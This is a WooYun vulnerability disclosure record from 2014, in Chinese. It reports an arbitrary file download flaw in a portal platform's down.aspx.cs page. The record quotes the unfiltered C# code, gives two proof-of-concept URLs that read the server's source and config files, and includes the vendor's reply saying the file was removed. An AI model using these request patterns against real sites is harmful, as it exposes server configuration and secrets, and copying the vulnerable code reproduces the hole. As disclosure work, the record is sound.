{"id": 57117, "wybug_id": "wooyun-2014-055282", "wybug_title": "某通用型门户平台任意文件下载漏洞", "wybug_corp": "mountor.cn", "wybug_author": "magerx", "wybug_date": "2014-04-03 10:19", "wybug_open_date": "2014-07-02 10:19", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向公众公开  简要描述： 蒙特某门户平台任意文件下载漏洞 详细说明：  漏洞文件:down.aspx.cs\nusing System;using System.Data;using System.Configuration;using System.Collections;using System.Web;using System.Web.Security;using System.Web.UI;using System.Web.UI.WebControls;using System.Web.UI.WebControls.WebParts;using System.Web.UI.HtmlControls;using System;   using System.IO; public partial class down : System.Web.UI.Page{    protected void Page_Load(object sender, EventArgs e)    {    string fileName=\"\";FileStream fileStream=new FileStream(Server.MapPath(\"/\")+Request[\"upfiles\"],FileMode.Open);//upfiles木有过滤～fileName = Request[\"upfiles\"].ToString().Substring(7);//命名方式从第7位开始long fileSize = fileStream.Length; Context.Response.ContentType=\"application/octet-stream\"; Context.Response.AddHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+fileName+\"\\\"\"); Context.Response.AddHeader(\"Content-Length\",fileSize.ToString()); byte[] fileBuffer=new byte[fileSize]; fileStream.Read(fileBuffer, 0, (int)fileSize); //到这里任意文件下载就产生了fileStream.Close(); Context.Response.BinaryWrite(fileBuffer); Context.Response.End();    }}\n以其中一个你们的客户做测试\nhttp://www.xxx.com.cn/down.aspx?upfiles=./down.aspx.cs\n\n\n\nhttp://www.xxx.com.cn/down.aspx?upfiles=./config\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  0.0   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-04-03 17:37 厂商回复： 感谢magerx。弱点隐患产生因该项目前台程序嵌套人员考虑不周，未对下载文件类型限致所致；同时项目代码审核员未进行必要性审核致弱点存在。经复查，该文件非必需，已删除。再次感谢magerx。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}